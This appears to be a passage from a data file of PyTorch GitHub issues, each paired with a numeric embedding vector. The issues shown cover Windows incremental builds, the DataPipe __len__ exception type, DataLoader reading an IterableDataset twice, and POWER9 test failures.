  6.12730756e-02  1.44180417e-01 -9.68572777e-03  2.03740671e-01
 -1.82289660e-01  2.90757895e-01 -2.74473995e-01 -2.41386011e-01
  2.46630520e-01 -1.65376350e-01 -1.16470359e-01 -2.17328638e-01
  1.89189613e-01  2.26437062e-01 -1.66241705e-01  2.85893321e-01
 -6.63961247e-02  2.65066504e-01  2.60297418e-01 -4.04129475e-02
 -1.28623724e-01  1.49275422e-01 -4.35618311e-02 -1.05288401e-01
  1.42041445e-02  2.50594139e-01 -1.46411002e-01 -4.18858230e-01]"
Incremental build isn't supported on Windows in fact. module: dependency bug module: build module: windows triaged,"## ðŸ› Bug

Build Source code with ninja is officially supported. 
But due to Ninja issue https://github.com/ninja-build/ninja/issues/1976, the incremental build isn't supported on Windows.
So, it rebuilds all code in fact if we rerun ` python setup.py install ` on Windows

So far, we can use sccache to accelerate the rebuild.
With nothing changed, it still takes 7 minutes to rerun` python setup.py install ` for CPU build on SSD 
For HDD, it takes about 20 minutes

## To Reproduce

Steps to reproduce the behavior:
1. clone pytorch source code on windows
2. build it
3. rerun 'python setup.py install' to rebuild.

## Expected behavior
The edit and compile cycle on windows doesn't take so much time.
For small change in leaf node, rebuild should be finished as soon as Linux.

## Additional context
From the exception message in #59688, I think the root cause is that ninja fails to parse Visual C++ compiler option when rebuilding.



cc @malfet @seemethere @walterddr @peterjc123 @mszhanyi @skyline75489 @nbcsm",True,"[-2.80600965e-01 -2.27659792e-01 -4.16483045e-01  3.59848738e-02
 -3.49492952e-03 -6.13396317e-02 -4.27617908e-01  8.72583985e-02
 -2.37830758e-01  7.76541652e-03 -4.10148859e-01  2.96040475e-01
  1.55982286e-01 -2.29398996e-01 -1.66845918e-01  2.36430109e-01
 -1.76982537e-01 -1.58107400e-01 -1.32403933e-02  1.29876472e-02
 -4.79554385e-01 -1.78412735e-01  1.15939170e-01  1.23867199e-01
  5.26817977e-01 -1.46087661e-01  4.46240827e-02 -1.37265623e-02
  1.21839374e-01  3.06297213e-01  1.47684500e-01  1.66298538e-01
 -9.89469290e-02 -1.84567764e-01  3.89662981e-01  2.45033696e-01
 -8.67145061e-02 -2.79368877e-01 -1.79348905e-02 -2.95214772e-01
 -3.58760715e-01  2.92708069e-01 -2.66687572e-01  1.39619589e-01
 -9.22255814e-02 -2.85540670e-02  5.37832305e-02 -1.22362114e-02
 -3.50799620e-01 -1.37632623e-01 -1.46626204e-01  4.80040498e-02
 -1.12472601e-01 -6.70668483e-01  2.53449082e-01 -1.51871532e-01
  5.56039438e-03  3.40724528e-01  2.82363355e-01 -1.08723514e-01
  2.93912292e-01 -1.03695519e-01  2.93798625e-01 -1.04506053e-02
 -2.18174905e-02  1.48089752e-02 -9.31155458e-02 -4.15334478e-04
  2.70349205e-01 -1.52077779e-01  1.74353659e-01 -1.13382474e-01
 -3.36331308e-01 -2.79829443e-01  5.79605736e-02 -2.33672962e-01
 -2.67931163e-01 -8.95357952e-02  8.20848197e-02  5.63796125e-02
 -4.27654609e-02 -2.38272905e-01  2.84658000e-02 -1.50629431e-01
  4.22333121e-01  8.12075362e-02  1.61955297e-01 -9.89628211e-02
  5.18420488e-02  1.92530677e-01  4.95950580e-01 -6.82934076e-02
  3.39448564e-02  3.84036124e-01 -1.25699848e-01 -1.37051120e-02
 -1.28962159e-01  1.82739705e-01 -1.60308525e-01 -2.37674788e-01
  1.46322325e-01 -1.32310912e-01 -1.89596087e-01  2.27928206e-01
  9.04467143e-03 -2.03980595e-01  3.10913384e-01  2.57089585e-01
 -3.79872322e-02 -8.68610889e-02  1.41003668e-01 -2.31576622e-01
  2.00991616e-01 -1.37366459e-01  2.86586225e-01  3.60121965e-01
 -3.40453327e-01  1.10868007e-01  7.10454956e-02  4.03150201e-01
  4.27707404e-01  2.22478330e-01  4.51890752e-04 -1.50524855e-01
  1.56930447e-01  8.50708410e-02 -1.18031763e-01  2.03444868e-01
  2.11581718e-02 -2.09723562e-02  1.15652293e-01  5.67805111e-01
  5.84632978e-02  3.33809629e-02  4.03651357e-01  8.13806206e-02
 -4.53836292e-01 -1.54954150e-01  4.31622118e-02 -1.20562926e-01
 -1.72632754e-01  1.99949771e-01  1.75831079e-01 -5.05387187e-01
 -1.15482807e-01 -9.32122096e-02 -8.18331838e-02  4.43574190e-01
 -8.00788924e-02 -3.36886048e-01  8.09498131e-02  1.56440645e-01
 -9.89175886e-02  1.88702233e-02  3.15502435e-01  3.49843234e-01
  5.40534332e-02  4.53581959e-02 -1.38553977e-01 -2.55124748e-01
 -3.27385753e-01  2.45816767e-01 -2.40414917e-01 -3.08710873e-01
  5.43483607e-02 -8.52380767e-02 -2.94163644e-01  7.29954541e-02
  2.68467695e-01  3.74790840e-02 -1.17247745e-01 -9.15672109e-02
  3.85618746e-01 -1.58872902e-01  3.61461461e-01  7.07505941e-02
 -7.47603402e-02 -1.65925190e-01  8.60682353e-02  5.30584097e-01
  3.73665541e-01  2.70734519e-01 -3.05487096e-01  2.95440722e-02
  1.13323390e-01 -3.80766615e-02  3.20707977e-01  1.81850586e-02
  4.02224585e-02  2.03359332e-02 -1.27545714e-01  2.81920314e-01
  2.12392628e-01 -2.16814831e-01 -3.13554890e-02  6.65588379e-02
  1.11182183e-01  1.17811561e-03  2.67514527e-01  1.35724083e-01
  1.98056903e-02  2.26938173e-01  2.87923366e-01 -1.06478542e-01
 -6.05674013e-02  7.51572251e-02 -3.76067787e-01 -4.07308806e-03
  7.22135752e-02  1.87498540e-01 -3.31336200e-01 -3.06106806e-01
  1.36062145e-01 -2.26081148e-01 -1.05555490e-01  3.25604305e-02
  2.44176090e-01 -1.58608288e-01  2.62717783e-01 -2.19366878e-01
  3.05988789e-01 -1.97894543e-01 -7.03189075e-02 -1.75047830e-01
  4.40817952e-01 -2.57304072e-01  1.65920004e-01 -2.46522754e-01
 -4.78958674e-02 -3.79055478e-02 -2.65868664e-01 -5.59032224e-02
  1.21036701e-01 -1.13618255e-01  2.47315049e-01 -6.22521527e-02
  2.60401696e-01  9.98705402e-02 -4.39815149e-02  4.10165340e-01
 -1.49009779e-01 -1.76677525e-01  6.89713061e-02 -1.70168161e-01
 -2.02204566e-02 -1.60676762e-01 -2.50801176e-01 -1.12805679e-01
  3.24754566e-02 -1.00200191e-01 -8.03731829e-02 -2.28490122e-02
  4.38735247e-01  1.44530118e-01  2.54212677e-01 -1.00649983e-01
 -4.00987953e-01  1.49896353e-01 -6.10744804e-02  3.19289893e-01
  1.53240964e-01  2.30934285e-02 -9.40836743e-02 -1.88178912e-01
  1.63473725e-01 -7.85520971e-02 -4.40056086e-01  2.26062179e-01
  1.98983938e-01 -7.05970079e-02  2.69117236e-01 -1.05014004e-01
 -9.21071544e-02 -1.59085929e-01  4.64740038e-01  2.26244837e-01
  4.86569047e-01 -2.04248786e-01 -1.25804335e-01  5.50693907e-02
  1.11357749e-01  1.75939053e-01 -4.66715693e-02  3.81106108e-01
  2.70448208e-01  5.77129312e-02 -2.75057275e-03 -2.69603789e-01
 -3.67250770e-01 -1.02431431e-01 -1.71147406e-01  2.18097553e-01
  9.75204632e-02 -2.94656783e-01 -2.05882609e-01  1.72561437e-01
 -3.04823846e-01 -1.43428296e-01 -4.85980175e-02 -1.23366021e-01
 -1.40780091e-01  1.71646103e-01  1.18567221e-01  2.47981727e-01
 -8.72605294e-02 -2.19864100e-01  1.75992787e-01 -1.10089839e-01
  2.21978530e-01 -4.04729009e-01  2.65023738e-01  3.77246737e-01
 -1.16178483e-01  3.30272257e-01 -1.62541986e-01 -8.06083530e-02
 -1.44411832e-01  2.72406876e-01  3.75538543e-02  1.15847707e-01
 -1.67621195e-01  2.13005349e-01 -4.08919573e-01  1.14990927e-01
  8.59054849e-02  2.73368396e-02 -4.58154641e-02 -1.05610907e-01
 -1.79237336e-01 -3.05981100e-01 -8.73280540e-02  1.52342767e-01
  9.17323306e-02  3.63743931e-01 -3.43288720e-01  2.17613712e-01
 -1.46212786e-01  1.73350856e-01 -4.86752316e-02 -5.00910766e-02
  1.04700245e-01 -1.69834226e-01  3.74033064e-01 -2.42399499e-01
 -5.48517883e-01  5.51293083e-02 -4.92337570e-02  4.30346727e-01
 -1.30014539e-01 -1.87701255e-01 -6.22497387e-02 -1.28285512e-01
 -5.02510309e-01  1.12359181e-01 -1.77144766e-01 -7.75921857e-03
 -1.15173139e-01  1.43009409e-01 -9.79059860e-02 -6.32010326e-02
 -3.98459911e-01 -1.56633168e-01 -2.23678440e-01 -1.09546423e-01
 -1.52841419e-01 -9.73112807e-02 -5.94358504e-01 -2.27957010e-01
 -2.62403965e-01 -6.44153208e-02  1.24333449e-01  4.28792864e-01
 -2.75828034e-01  2.98001617e-01  4.19671059e-01 -4.87018935e-03
 -2.15715349e-01  4.59172368e-01 -3.97188105e-02 -6.67314976e-02
 -4.30679880e-02  2.67862737e-01  1.66409373e-01 -2.71909028e-01]"
`NotImplementedError` is not right Exception for `DataPipe.__len__` module: dataloader triaged,"## ðŸ› Bug

Thanks to @pmeier, a bug of `IterDataPipe` was found. For each `IterDataPipe` class, we raise `NotImplementedError` in `__len__` in some cases such as `length` is -1 or prior `DataPipe` is not `Sized`.

When we apply `tqdm` to the `DataPipe` instance without explicit length, `len(dp)` will be called and the `NotImplementedError` will emit. So, we can never use `tqdm` for such kind of DataPipe. However,  we are actually expecting DataPipe with `NotImplementedError` as an infinite length. 

And, based on the definition of [`NotImplementedError`](https://docs.python.org/3/library/exceptions.html#NotImplementedError), it's not an appropriate Exception since this exception normally raises from base class to enforce derived class implementing this method.

And, considering the implementation of `tqdm`, we should switch `NotImplementedError` to `TypeError`.
https://github.com/tqdm/tqdm/blob/05ad200df3ccbc21c5c840d064e619ec9838f902/tqdm/std.py#L983-L990

## To Reproduce

```py
>>> import tqdm
>>> class DP(IterDataPipe):
...     def __len__(self):
...         raise NotImplementedError
... 
>>> dp = DP()
>>> pbar = tqdm.tqdm(dp)
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
  File ""/Users/erjia/tools/miniconda3/envs/pt/lib/python3.8/site-packages/tqdm/std.py"", line 985, in __init__
    total = len(iterable)
  File ""<stdin>"", line 3, in __len__
NotImplementedError
```

## Expected behavior

By switching to `TypeError`, DataPipe works with `tqdm` correctly.
BTW, we should not create `__len__` at runtime since this method is attached to `class` object. When we change it, behavior of all instances will change. Any other suggestions to fix it are welcomed.

cc @SsnL @VitalyFedyunin @ejguan",True,"[-6.15177117e-02 -1.76275879e-01 -2.51973271e-01 -4.67715800e-01
 -2.32652158e-01 -4.57905054e-01  9.22484845e-02  2.48594791e-01
 -6.83659017e-01  7.20855892e-02 -4.01485413e-02  1.40725821e-03
 -3.89830302e-03  3.10922772e-01 -1.41560435e-01  5.07915199e-01
  7.28509724e-02  6.50934204e-02 -6.94347769e-02 -3.15950401e-02
  1.81462020e-01  4.56363767e-01 -2.21874446e-01  2.09699795e-01
  7.51803070e-03  1.06511638e-01 -2.86765009e-01  1.15120023e-01
  1.33057490e-01  4.38580036e-01 -3.45080048e-01  1.20007873e-01
 -1.41092241e-02  1.64881706e-01 -6.83276802e-02  4.34355699e-02
 -4.84290898e-01 -1.21594429e-01 -3.14686656e-01  1.52785569e-01
 -3.71435523e-01 -1.26222342e-01 -2.98176557e-01 -3.03129256e-01
 -5.79731226e-01 -4.01309758e-01 -2.68717170e-01  3.55281562e-01
 -3.25872153e-01 -3.02454263e-01 -2.64132261e-01  2.68420815e-01
 -8.88749510e-02 -8.29383265e-03  1.48411274e-01 -2.12380961e-01
 -3.69469106e-01  2.48312801e-01 -8.78372341e-02  1.47079900e-01
  1.75228268e-01 -3.66322815e-01  5.01033142e-02 -4.93427031e-02
 -1.49420112e-01  1.79465041e-01  5.26642799e-01 -1.38105407e-01
  3.11165869e-01 -2.50209570e-01  1.76245600e-01 -1.86194964e-02
 -3.60009789e-01  1.29694343e-01  1.65594593e-02  2.80242920e-01
 -1.31493986e-01  7.75906518e-02 -4.30187196e-01 -2.73199201e-01
 -4.39696431e-01  3.04363787e-01  1.18178889e-01  3.90546285e-02
 -1.48525625e-01 -1.95235774e-01 -3.08601588e-01  3.75812389e-02
 -1.30531281e-01  1.80736959e-01  6.93679154e-02 -7.76202753e-02
 -2.66464770e-01  6.56576157e-01 -6.79654181e-02  4.99509163e-02
  1.08805925e-01  1.44911751e-01 -3.22017759e-01 -3.77108276e-01
  1.07632011e-01 -2.15199530e-01 -5.83850086e-01  4.88913924e-01
  8.39675665e-02 -3.20592895e-04  1.99957922e-01  1.44988477e-01
 -3.39485370e-02  1.23008400e-01  3.18794399e-01  1.92016304e-01
  3.48584540e-02 -8.00237134e-02 -9.76599082e-02  2.57081389e-01
 -3.23722363e-01 -1.62086666e-01 -4.75167722e-01  2.05708623e-01
 -2.62611359e-01 -1.20928831e-01 -2.29590133e-01  3.26516449e-01
  3.89882833e-01  1.35356992e-01 -5.18010855e-02 -4.50367779e-02
  3.01797837e-01  4.09656614e-02  2.45664209e-01 -1.09620586e-01
 -7.49631301e-02 -1.35004707e-02  1.70198195e-02  5.03681779e-01
 -2.71274924e-01  2.84327008e-02 -2.35082731e-01 -2.12214425e-01
 -1.35372207e-02 -2.00269550e-01  2.17701625e-02 -4.70423013e-01
  1.20432757e-01  1.66944742e-01 -3.37691128e-01  2.76992135e-02
  2.00507164e-01 -1.15654290e-01  3.54579836e-02  2.97232211e-01
 -1.81786954e-01  1.94062844e-01 -1.44878522e-01 -1.39768288e-01
  7.45326400e-01  9.80648249e-02  2.47079432e-01 -3.69843662e-01
  5.62855601e-02  3.25908661e-02  5.82221933e-02 -4.13237751e-01
  4.14192051e-01  1.10204577e-01 -1.44590020e-01 -3.17037165e-01
 -1.29532814e-01 -1.73846856e-01 -2.22242206e-01 -1.26632854e-01
  3.95325780e-01 -3.08280706e-01  5.14743850e-02 -1.42354947e-02
 -3.29956800e-01 -3.21219504e-01  6.00819826e-01  2.45282263e-01
  1.64686114e-01  7.68935800e-01  3.01706076e-01 -7.38221109e-02
 -9.88868028e-02  5.12885228e-02 -1.60764176e-02  4.67242330e-01
  2.82150954e-02 -1.50633603e-02 -1.21606104e-02 -3.46896291e-01
  1.03277832e-01  2.31048748e-01 -2.99902670e-02 -4.02323961e-01
  8.50677118e-02 -1.35662034e-02  1.70526251e-01  1.01896420e-01
 -1.44790739e-01  7.69651055e-01  2.33809978e-01  1.77339524e-01
  4.13148031e-02 -2.19501406e-01  1.17682159e-01 -3.95631135e-01
 -3.73004794e-01  2.31409147e-01 -1.16279937e-01 -2.68795043e-01
 -3.13061655e-01 -5.36764860e-01 -1.08813412e-01 -4.04936135e-01
 -1.30013406e-01  1.61345482e-01 -1.37966275e-01  3.01660717e-01
 -4.94492739e-01 -2.94342995e-01  4.10296738e-01 -3.15727651e-01
  2.25278467e-01  2.88307190e-01  7.32676685e-02 -1.53929219e-01
 -6.97402731e-02  1.00163117e-01  2.23292261e-01 -2.10916158e-02
 -5.89084998e-03 -1.75299212e-01  5.94758615e-02  1.94354177e-01
  1.63201779e-01 -7.26859495e-02  7.11321384e-02  1.79594845e-01
 -1.31609261e-01 -3.35979275e-02 -2.19497025e-01 -1.33091971e-01
  2.94884115e-01 -3.44613940e-03  4.32848111e-02 -1.57385707e-01
 -2.16867030e-01 -3.26179452e-02 -4.05855477e-01  2.43080214e-01
  4.08773214e-01  1.95168741e-02  5.39257586e-01  2.57707775e-01
  1.46846578e-01 -4.29947495e-01 -8.58044028e-02 -1.20779365e-01
 -2.05474928e-01  1.25305071e-01 -5.76524064e-03  5.38697779e-01
 -1.26133740e-01 -4.65166569e-03  3.91318426e-02  1.65016770e-01
 -2.26117283e-01 -3.71211112e-01  1.59014225e-01 -1.09041676e-01
  1.34684950e-01 -2.34932557e-01  4.27395791e-01  1.07891113e-01
  6.43922448e-01  1.89638436e-01  3.76962930e-01 -3.40187922e-02
  3.19917619e-01  2.67988324e-01 -1.89869292e-02 -1.73495505e-02
  4.15976912e-01 -2.36682728e-01 -1.69814318e-01 -2.80913234e-01
 -4.78623901e-04  9.20912474e-02  2.78750300e-01 -1.59890369e-01
  1.52766228e-01  1.92100614e-01  6.34694993e-02  7.85699934e-02
  1.38927013e-01  3.11089195e-02  1.31271467e-01  1.99813135e-02
 -3.93221736e-01  2.61575133e-01 -1.55661285e-01 -1.12317525e-01
 -1.49299994e-01  2.03139514e-01  2.27233469e-01  1.13033667e-01
  5.25829136e-01 -3.12188864e-01  6.55277848e-01  2.13596910e-01
 -1.07455283e-01  3.34687442e-01 -1.07511878e-03  4.71061319e-02
  1.20938532e-02  1.91838965e-01  2.96618700e-01  6.09981716e-02
 -1.96633965e-01 -4.28917795e-01 -3.46196771e-01 -1.16246380e-01
  4.78060484e-01  2.46815026e-01 -2.36850590e-01  2.07769603e-01
 -8.81159902e-02  9.61481780e-02  3.07853580e-01 -3.74272615e-02
 -4.48863916e-02  1.37702838e-01  2.78440595e-01 -5.30163884e-01
  4.37031165e-02  4.64393664e-03  3.48536260e-02  1.56629503e-01
 -2.63761461e-01 -2.32603699e-01 -3.97803873e-01 -3.85771990e-01
 -1.40829712e-01 -3.57858509e-01  1.38171598e-01  6.00734949e-01
 -1.55779600e-01  2.90295202e-03  9.10758972e-02  2.01914027e-01
  1.58972591e-01 -1.06899798e-01 -2.06867963e-01  4.94171381e-01
 -1.41397327e-01  3.39071274e-01 -2.84317791e-01 -1.00899622e-01
 -3.71218443e-01  1.14152737e-01 -3.07746768e-01 -3.16136032e-02
  1.46244764e-01 -4.30488028e-03  1.96877997e-02  3.64594042e-01
  3.78333718e-01  4.07167733e-01 -2.34180376e-01  4.61263120e-01
 -1.04705267e-01 -2.82795951e-02 -2.92628277e-02  2.29570568e-01
  2.79594243e-01 -3.70397002e-01 -1.59230381e-01 -1.05122849e-03
 -2.03116894e-01  8.80927518e-02  2.12662052e-02 -1.92613393e-01]"
torch.utils.data.DataLoader scans IterableDataset twice before it stops module: dataloader triaged module: data,"## ðŸ› Bug

`torch.utils.data.DataLoader`, when works with a customized `torch.util.data.IterableDataset`, scans the dataset **twice**, as shown in my diff D28508287.

To make it easy to reproduce the problem, Shunting Zhang simplified the above diff into paste P415580779, which reveals that `torch.utils.data.DataLoader` doesnâ€™t stop calling next after the IterableDataset raised StopIteration exception.

## To Reproduce

Please try the following customized IterableDataset with DataLoader.

```python
class CachingIterator:  # depends on CachedIterable so cannot be nested class.
    def __init__(self, ds: CachedIterable):
        self.ds = ds
        self.pos = -1
        self.raise_num = 0

    def __next__(self) -> Any:
        if self.raise_num == 1:
            self.raise_num == 2
            raise StopIteration

        if self.ds.itrt is not None:
            i = next(self.ds.itrt, None)
            if i is not None:
                self.ds.cache.append(i)
                return i
            else:
                print(""CachingIterator stopes"")
                self.ds.itrt = None  # notify CachedIterable.__iter__ to yield cache.
                self.raise_num += 1
                raise StopIteration
        else:
            if self.pos + 1 < len(self.ds.cache):
                self.pos = self.pos + 1
                return self.ds.cache[self.pos]
            else:
                raise StopIteration
```

## Additional context

@dzhulgakov identified the bug is due to that the fetcher doesn't remember it had encountered StopIteration. For details, please see his comment at https://fb.quip.com/nvyoAJgmzBzZ#PBKACAQVfEj


cc @VitalyFedyunin @ejguan @SsnL",True,"[-0.15637374  0.08079337 -0.19094454  0.02820794 -0.00118699 -0.30860382
 -0.10442752 -0.01830416 -0.5798894   0.01385532 -0.07792193 -0.34700727
 -0.22044562  0.07396668 -0.26794904 -0.00951888 -0.14107472 -0.06566164
 -0.16689983 -0.18268885  0.23463309 -0.03143388 -0.16533768 -0.1574922
 -0.03953075  0.3983056  -0.20854364 -0.13519633  0.18944742 -0.03184048
 -0.13706312 -0.09147312 -0.54924977  0.35339174  0.29287738 -0.17131373
 -0.55308336 -0.0181024  -0.1283765  -0.14063796  0.37017024  0.10427953
  0.0062761  -0.07621394 -0.2837081   0.16870256 -0.27616298  0.21778208
 -0.46763572  0.09292682 -0.06759866  0.14334014 -0.20967963 -0.05134626
  0.27455595 -0.2926625   0.05403791  0.0521646   0.08655894 -0.26440078
  0.20141104 -0.0826639  -0.1119782  -0.15881307  0.08597349 -0.13379438
  0.04972669 -0.4295265   0.5824066  -0.11262158 -0.01972565  0.3005277
 -0.14379023  0.00297348 -0.20571195  0.01814497 -0.5474184   0.3243783
 -0.40693548 -0.4498691   0.05289914  0.19297616  0.10220893  0.27717477
  0.02138104 -0.13430968  0.16769327 -0.30584762  0.19960985  0.38650483
 -0.04860626 -0.03100302  0.22511446  0.421336   -0.54817533 -0.04932735
  0.18671215  0.1808731   0.08023779 -0.25832158 -0.1661736  -0.58943486
 -0.3214182   0.56919587  0.12696125 -0.5041711   0.02672901  0.19264032
  0.28667244  0.00474973  0.1637627   0.30230635 -0.22556391 -0.1955539
 -0.04917336 -0.4559746  -0.44953066  0.18116339 -0.61887217  0.23433168
  0.25884384 -0.00925604 -0.07407634  0.01447413  0.49316406 -0.0689439
  0.1643587  -0.01781855  0.1111975  -0.16574638  0.10701925  0.0591914
 -0.03316981 -0.534633    0.2520057   0.4378785  -0.57204485  0.01807012
 -0.05129483  0.10957415 -0.07027052  0.11590481  0.0351395  -0.02166018
  0.29104397  0.13848089 -0.23975939  0.21222807  0.21860161  0.02900654
  0.19826895 -0.13063584 -0.30474493  0.3119436   0.08899775  0.07089074
  0.31195998  0.2986097   0.5660652  -0.30021417  0.1082921   0.26157764
 -0.15699959 -0.15764791  0.5237675  -0.17554502 -0.01515466  0.08329783
 -0.15889513  0.13212624  0.10213232 -0.31754026 -0.19735935 -0.2514421
  0.06899475 -0.1993393   0.08026216 -0.14323679  0.20892541  0.00700937
  0.4620083   0.4010409   0.3118797  -0.02356278  0.16747817 -0.15504363
  0.40666145  0.34874868 -0.01443224 -0.403691   -0.2902791  -0.2212985
  0.15749325 -0.0053525   0.1447387   0.00297744 -0.02115591 -0.03652697
 -0.06488028 -0.03039683  0.18428025  0.04134573  0.03508766 -0.07170047
  0.14414471 -0.05089723 -0.633264   -0.32016438 -0.30102473  0.12961525
 -0.1787836  -0.22531766 -0.5822535  -0.12015602  0.19269696 -0.09595102
 -0.24510832  0.11746757 -0.19373812  0.32136363  0.12454326 -0.12344439
 -0.09796038 -0.25507542  0.08716766  0.31270146 -0.218802    0.10161728
 -0.09746354 -0.05541144  0.05067804 -0.01100316 -0.03248841  0.05336095
  0.08061294  0.27138552 -0.09289265 -0.21137081 -0.24911182  0.3364284
 -0.1727297  -0.18277161 -0.13021654 -0.3375637  -0.4670444   0.06317608
  0.02332595 -0.3226547  -0.1441133   0.00852916 -0.03087624 -0.24141698
  0.08328849 -0.09040177  0.3189984   0.17272182  0.16956955 -0.36644706
 -0.09939313 -0.11253961  0.2553024   0.0366471   0.23894733  0.53241944
 -0.04629307  0.05104268 -0.0253708   0.21470797  0.00359094 -0.08946727
 -0.1346132   0.02530055  0.32316393  0.35987845  0.4863302  -0.19431776
  0.24652618  0.16065496  0.11517958 -0.00614375  0.3689614   0.26592284
 -0.0950279   0.0531244   0.3832098  -0.2515036  -0.09644063 -0.02639793
 -0.13318859  0.23087737  0.10995878 -0.16354275  0.593843    0.04049735
 -0.3782569  -0.12046048  0.14138377 -0.08678314  0.2761255   0.13318902
 -0.46895075  0.0984461   0.2544008   0.20841007 -0.23001894 -0.11139382
  0.19596669  0.05137749  0.48030406 -0.36951685  0.15424079 -0.09096771
 -0.17574528  0.14400408 -0.01977898 -0.08795755  0.08242106  0.07319495
  0.15003392  0.0030602  -0.1861699  -0.49490288 -0.0914847   0.14093001
  0.2464132  -0.02497508 -0.14615199  0.6437985  -0.00773249  0.14051424
  0.11140601 -0.19221953  0.10929662  0.37067986  0.09162086 -0.45562485
  0.23263377  0.4035888  -0.11235401 -0.23002535 -0.27350137 -0.19486704
 -0.11065166 -0.44845876 -0.13314326  0.10554332  0.0430516   0.27046028
 -0.25500095  0.0563513  -0.03198693 -0.20703954  0.25501156  0.23229018
  0.03612093  0.5515612  -0.06623957  0.34672385  0.10640915  0.23964462
  0.25006592  0.2918818  -0.13169914  0.02738537 -0.14271362  0.0687822
 -0.12538141  0.1020565   0.21833956  0.45666975 -0.27931157  0.13289954
  0.12414223  0.16571409  0.3202374  -0.1297276   0.35917205 -0.49403268
  0.11900749  0.32752421  0.35793367  0.26657534 -0.1442645  -0.22844556]"
Multiple failures in test_unary_ufuncs on POWER module: tests triaged module: POWER,"## ðŸ› Bug

A large bunch of tests in test_unary_ufuncs fails on POWER9 after the vector intrinsic introduction in PyTorch 1.8 they look related hence pasted as a single issue.

## To Reproduce

Steps to reproduce the behavior:

1. run `test_unary_ufuncs.py` on PPC

## Expected behavior

Tests pass

## Environment

 - PyTorch Version (e.g., 1.0): 1.8.1
 - OS (e.g., Linux): Linux
 - How you installed PyTorch (`conda`, `pip`, source): source
 - Build command you used (if compiling from source): `CMAKE_BUILD_TYPE=Release BUILD_TEST=0 PYTORCH_BUILD_VERSION=1.8.1 PYTORCH_BUILD_NUMBER=1 MAX_JOBS=$(nproc) BLAS=Eigen USE_FFMPEG=1 BUILD_CUSTOM_PROTOBUF=0 USE_IBVERBS=1 USE_CUDA=0 USE_METAL=0 python setup.py install`
 - Python version: 3.8.6

## Additional context

I'll try to categorize the tests into failure types and (possible) explanations:

- test_contig_vs_every_other_angle_cpu_complex64: 256 / 513 elements failed `The greatest difference was 3.0628208592534065 (-3.096264600753784 vs. -0.033443741500377655)`: Looks like the VSX version gets bogus values here
-  test_contig_vs_every_other_angle_cpu_float32/float64, test_non_contig_angle_cpu_float32/float64, test_non_contig_expand_angle_cpu_int16/int32/int64/int8: `greatest difference was 3.1415927410125732 (0.0 vs. 3.1415927410125732)`: This is an omission: The VSX implementation does not return PI when the argument is negative: https://github.com/pytorch/pytorch/blob/afdfd2288ab839ece89e667e44777201536b2d82/aten/src/ATen/cpu/vec/vec256/vsx/vec256_double_vsx.h#L257
- test_non_contig_angle_cpu_complex128/complex64: `greatest difference was 1.5819721883714497 (0.8557325138535072 vs. 2.437704702224957)` and `greatest difference was 2.4029039442539215 (-0.4417212903499603 vs. -2.844625234603882)`: Similar to the first although the relation to (almost) pi/2 and 3/4*pi suggest some mixing of values
- test_non_contig_index_angle_cpu_complex128: `greatest difference was 0.38246162968485264 (-1.3715882372626278 vs. -1.7540498669474804)`
- test_reference_numerics_angle_cpu_complex128/complex64: Similar failures, probably the whole complex-angle stuff is bugged
- test_reference_numerics_angle_cpu_float32/float64: `greatest difference was nan (0.0 vs. nan)`, not sure here, maybe same as point 2
- test_reference_numerics_angle_cpu_int16/int32/int64/int8: Same as 2 (PI vs 0)
- test_reference_numerics_log1p_cpu_float32 (and log10, log2, log): Compares a value (88.72283935546875, 128.0, 38.53184127807617) against inf
- test_reference_numerics_logit_cpu_float32 `greatest difference was nan (-87.3365478515625 vs. nan)`
- test_sgn_cpu_complex128/complex64: `greatest difference was 0.5775589227244207 (0.8735823660790683 vs. 0.29602344335464753)` and `greatest difference was 0.38670969009399414 (-2.521059989929199 vs. -2.9077696800231934)`, it is the angle comparison that fails, so same as 1

cc @mruberry @VitalyFedyunin @walterddr",True,"[-6.22694373e-01 -5.16288728e-03 -3.23396921e-01  3.36039245e-01
 -3.97992805e-02 -4.77995962e-01 -7.39795044e-02  1.95509106e-01
 -4.13196206e-01 -2.81775832e-01  1.71940967e-01  7.40072131e-02
  2.10743118e-03  2.13248841e-02  1.07586533e-01  1.92207098e-01
 -1.24918096e-01 -5.61174095e-01  8.80537778e-02  5.70694618e-02
  1.38719141e-01 -1.64294273e-01 -1.31321669e-01  1.89924419e-01
 -2.47525886e-01 -6.35110959e-02 -3.98678780e-01 -1.28547877e-01
  3.01639855e-01  3.00306343e-02  3.68761271e-01  3.51756155e-01
 -2.63021588e-01 -1.43892720e-01  3.25500481e-02  2.44873255e-01
 -1.35907829e-01 -2.55389154e-01 -1.26030624e-01 -1.35277048e-01
  2.80669294e-02 -6.08354025e-02  6.62184879e-02  1.77600533e-01
 -1.59529120e-01 -1.40338421e-01  2.24734098e-01  2.97986299e-01
 -2.55807102e-01 -2.70429313e-01  2.31272340e-01  1.28892198e-01
 -2.94271529e-01 -4.87400860e-01  4.43849087e-01 -3.23363662e-01
  9.85965282e-02 -1.75497495e-04  5.18768653e-02 -1.54558331e-01
  1.50969783e-02  1.05104595e-01 -3.05936903e-01 -1.46515936e-01
  2.42231965e-01  2.06131451e-02  6.56579956e-02 -3.85966748e-02
  4.40324843e-01  3.15215856e-01  2.06715949e-02 -1.77144378e-01
 -2.33280301e-01 -7.47868195e-02  1.03537276e-01  2.75640309e-01
 -4.13091958e-01  1.15839958e-01 -4.18628976e-02 -6.84153810e-02
  2.10987076e-01 -2.77108610e-01  1.58308968e-01 -1.38821870e-01
  2.86973596e-01  3.57525162e-02  1.99012384e-02 -1.81848943e-01
  2.32186764e-01 -1.97442666e-01  2.46998772e-01  1.29713953e-01
 -1.55987442e-01  3.63481343e-01 -5.43254241e-02  3.57628986e-02
 -4.44910303e-02 -2.95325398e-01 -2.37038694e-02  6.26397133e-02
  1.62172914e-01 -3.67048621e-01 -1.79541692e-01  3.31087887e-01
 -1.72082156e-01 -1.03708670e-01  3.35188396e-02  3.10057551e-01
  1.65026277e-01 -1.53728455e-01  7.46879876e-02  1.32705308e-02
 -1.91286311e-01  8.87980312e-02  1.95286900e-01 -1.18745044e-01
 -2.62026265e-02 -1.52814731e-01 -1.65757120e-01  1.09755412e-01
  1.96146131e-01  6.88473359e-02  1.31486475e-01 -1.98801253e-02
  3.85902703e-01  4.57802415e-02  4.25506160e-02  6.14165664e-02
  7.00674625e-03  5.11251427e-02  1.41983524e-01  2.46218190e-01
 -7.51357153e-02  1.28598288e-01  3.27793568e-01  3.58196944e-02
 -5.48296124e-02  9.17974189e-02  1.46639615e-01  3.09814543e-01
